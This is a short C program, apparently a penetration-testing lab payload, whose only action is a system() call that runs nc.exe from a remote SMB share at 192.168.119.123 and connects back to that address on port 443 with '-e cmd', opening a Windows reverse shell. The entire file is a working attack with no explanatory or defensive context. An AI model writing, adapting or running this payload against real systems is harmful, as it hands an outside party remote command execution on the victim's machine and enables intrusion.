#include <stdlib.h>
int main ()
{
int i;
i = system ("START /B \\\\192.168.119.123\\smb\\nc.exe 192.168.119.123 443 -e cmd");
return 0;
}
